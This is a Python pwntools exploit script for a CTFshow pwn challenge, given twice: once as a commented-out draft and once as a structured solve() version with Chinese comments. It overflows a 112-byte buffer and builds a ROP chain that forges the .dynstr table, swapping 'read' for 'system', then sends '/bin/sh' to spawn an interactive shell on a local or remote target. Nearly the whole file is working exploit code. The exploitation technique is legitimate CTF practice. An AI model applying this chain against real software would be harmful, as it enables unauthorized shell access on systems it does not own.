'''
from kk import *
context.log_level = 'debug'
io = process("./pwn")
#io = remote('pwn.challenge.ctf.show',28291)
elf = ELF("./pwn")
rop = ROP("./pwn")
io.recvuntil(b'Welcome to CTFshowPWN!\n')
offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4)                      

dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")
rop.read(0,0x080498E0,len((dynstr)))            

rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08048376)                             

rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p32(0x080498E0))
io.send(dynstr)
io.send(b"/bin/sh\x00")

io.interactive()
'''



from kk import*
#context(arch='i386', os='linux')
#context(arch='amd64', os='linux')
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'
# 根据是否远程自动选择 libc

if args.REMOTE:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

def start():
    if args.KK:
        return remote('pwn.challenge.ctf.show', 28227)
    else:
        return process('./pwn')
#python3 exp.py本地 #python3 exp.py KK=1远程

def solve():
    p = start()
    p.recvuntil(b'Welcome to CTFshowPWN!\n')
    offset = 112
    rop.raw(offset*'a')
    rop.read(0,0x08049804+4,4)                      

    dynstr = elf.get_section_by_name('.dynstr').data()
    dynstr = dynstr.replace(b"read",b"system")
    rop.read(0,0x080498E0,len((dynstr)))            

    rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
    rop.raw(0x08048376)                             

    rop.raw(0xdeadbeef)
    rop.raw(0x080498E0+0x100)
    # print(rop.dump())
    assert(len(rop.chain())<=256)  #ROP 链长度超过 256 字节，程序就直接报错退出。
    rop.raw("a"*(256-len(rop.chain())))
    p.send(rop.chain())   #rop链发送
    p.send(p32(0x080498E0))
    p.send(dynstr)
    p.send(b"/bin/sh\x00")


    p.interactive()

if __name__ == "__main__":
    solve()